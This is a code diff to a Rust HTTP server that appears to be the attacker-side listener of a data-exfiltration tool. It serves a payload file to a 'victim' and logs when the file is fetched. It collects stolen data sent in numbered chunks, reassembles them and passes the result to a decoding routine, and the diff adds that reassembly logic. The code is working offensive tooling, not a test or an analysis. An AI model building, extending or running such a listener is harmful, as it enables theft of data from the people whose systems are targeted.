@@ -4,19 +4,21 @@ use tokio::fs::File;
 use tokio_util::codec::{BytesCodec, FramedRead};
 use termion::color;
 use url::form_urlencoded;
+use std::cmp::Ordering;
 use std::collections::HashMap;
 use std::sync::{Arc, Mutex};
 
-//use crate::convert;
+use crate::convert;
+use crate:: process_payload;
 
-struct Counter{
+pub struct Counter{
     payload: String,
     count: u32,
 }
 
 /// This is our service handler. It receives a Request, routes on its
 /// path, and returns a Future of a Response.
-pub async fn exfil(req: Request<Body>, _logfile: String, _verbosity: bool, mutex: Arc<Mutex<Counter>> ) -> Result<Response<Body>, hyper::Error> {
+pub async fn exfil(req: Request<Body>, logfile: String, mutex: Arc<Mutex<Counter>> ) -> Result<Response<Body>, hyper::Error> {
     match (req.method(), req.uri().path()) {
         // Serve some instructions at /
         (&Method::GET, "/") | (&Method::GET, "/index.html") =>{
@@ -30,8 +32,10 @@ pub async fn exfil(req: Request<Body>, _logfile: String, _verbosity: bool, mutex
                 println!("{}[!] Payload Fetched By Victim!{}", color::Fg(color::Magenta), color::Fg(color::Reset));
                 let stream = FramedRead::new(file, BytesCodec::new());
                 let body = Body::wrap_stream(stream);
+                
                 return Ok(Response::new(body));
             }
+
             println!("[!] Could Not Find File!");
             Ok(Response::new(Body::from("NOT FOUND")))
         },
@@ -59,7 +63,37 @@ pub async fn exfil(req: Request<Body>, _logfile: String, _verbosity: bool, mutex
             
             let num: u32 = num.as_str().trim().parse().unwrap();
             
-            println!("[+] Received {} chunks as : {}",num+1, chunk);
+            println!("{}[+] Received {} chunks.{}",color::Fg(color::Magenta),num+1,color::Fg(color::Reset));
+            println!("{}[+] Chunk:{}\n{}",color::Fg(color::Cyan),color::Fg(color::Reset),chunk);
+            {
+                let iter: u32 ;
+                
+                {
+                    let x = mutex.lock().unwrap();
+                    iter = x.count;
+                }
+                
+                match num.cmp(&iter){
+                    Ordering::Less => {
+                        let mut x = mutex.lock().unwrap();
+                        x.payload.push_str(chunk);
+                    },
+                    Ordering::Equal => {
+                        let enc_payload: String;
+                        {
+                            let mut x = mutex.lock().unwrap();
+                            x.payload.push_str(chunk);
+                            enc_payload = x.payload.clone();
+                            println!("Payload = {}",x.payload);
+                        }
+                        process_payload::decode_payload(enc_payload.as_str(), logfile);
+                    },
+                    Ordering::Greater => {
+                        convert::exit_on_error("Error Receiving Chunks :(");
+                    }
+                }
+
+            }
             Ok(Response::new(Body::from("Ok")))
         },
 
@@ -84,7 +118,7 @@ pub async fn exfil(req: Request<Body>, _logfile: String, _verbosity: bool, mutex
                 let mut x = mutex.lock().unwrap();
                 x.count = number_of_chunks ;
             }
-            println!("{}[+] Fetching Data In A Total Of {} chunks{}",color::Fg(color::LightGreen), number_of_chunks+1,color::Fg(color::Reset));
+            println!("{}[+] Fetching Data In A Total Of {} chunks{}",color::Fg(color::Red), number_of_chunks+1,color::Fg(color::Reset));
             Ok(Response::new(Body::from("Ok")))
         },
 
@@ -99,10 +133,9 @@ pub async fn exfil(req: Request<Body>, _logfile: String, _verbosity: bool, mutex
 }
 
 #[tokio::main]
-pub async fn start_listener(port: u16, logfile: String, verbosity: bool) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
+pub async fn start_listener(port: u16, logfile: String) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
     
     println!("{}[+] Logfile: {}",color::Fg(color::Yellow), logfile);
-    println!("{}[+] Verbosity: {}",color::Fg(color::LightRed), verbosity);
     
     let addr = ([0, 0, 0, 0], port).into();
 
@@ -110,23 +143,23 @@ pub async fn start_listener(port: u16, logfile: String, verbosity: bool) -> Resu
     let count: u32 = 0;
 //    let mut get_counter = Counter{ payload, count };
 
-    let mut primary_mutex :  Arc<Mutex<Counter>> = Arc::new(Mutex::new(Counter{ payload, count }));
+    let primary_mutex :  Arc<Mutex<Counter>> = Arc::new(Mutex::new(Counter{ payload, count }));
 
 
     //let service = make_service_fn(|_| async { Ok::<_, hyper::Error>(service_fn(exfil)) });
     let service = make_service_fn(move |_| {
         let logfile = logfile.clone();
-        let mut primary_mutex = primary_mutex.clone();
+        let primary_mutex = primary_mutex.clone();
         async move {
             Ok::<_, hyper::Error>(service_fn(move |req| {
-                exfil(req, logfile.clone(), verbosity, primary_mutex )
+                exfil(req, logfile.clone(), primary_mutex.clone() )
             }))
         }
     });
 
     let server = Server::bind(&addr).serve(service);
 
-    println!("{}[!] Listening on http://{}{}",color::Fg(color::LightBlue), addr,color::Fg(color::Reset));
+    println!("{}[!] Listening on http://{}{}",color::Fg(color::Cyan), addr,color::Fg(color::Reset));
 
     server.await?;
 
